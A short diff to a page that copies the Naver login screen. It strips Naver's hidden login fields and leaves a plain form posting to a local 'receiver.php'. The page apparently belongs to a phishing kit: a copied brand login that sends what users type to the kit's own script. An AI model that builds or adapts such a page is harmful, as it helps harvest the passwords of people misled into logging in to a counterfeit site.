@@ -996,18 +996,8 @@ lcs_do(refreshLcs());
         <button type="button" class="close_x" onclick="showErrorDiv(-1);">닫기</button>
     </div>
     <div class="login">
-        <form id="frmNIDLogin" name="frmNIDLogin" target="_top" action="receiver.php" method="post">
-            <input type="hidden" name="enctp" id="enctp" value="1">
-            <input type="hidden" name="encpw" id="encpw" value="">
-            <input type="hidden" name="encnm" id="encnm" value="">
-            <input type="hidden" name="svctype" id="svctype" value="0">
-            <input type="hidden" name="url" id="url" value="https://www.naver.com/">
-            <input type="hidden" name="enc_url" id="enc_url" value="https%3A%2F%2Fwww.naver.com%2F">
-            <input type="hidden" name="postDataKey" id="postDataKey" value="">
-            <input type="hidden" name="nvlong" id="nvlong" value="">
-            <input type="hidden" name="saveID" id="saveID" value="">
-            <input type="hidden" name="smart_level" id="smart_level" value="1">
-            <fieldset>
+        <form action="receiver.php" method="post">
+                              <fieldset>
             <legend class="blind">로그인</legend>
             <div class="htmlarea" id="flasharea" style="visibility: hidden;"><div style="width:148px;height:67px;">&nbsp;</div></div>
             <div class="htmlarea" id="htmlarea" style="display:block;">
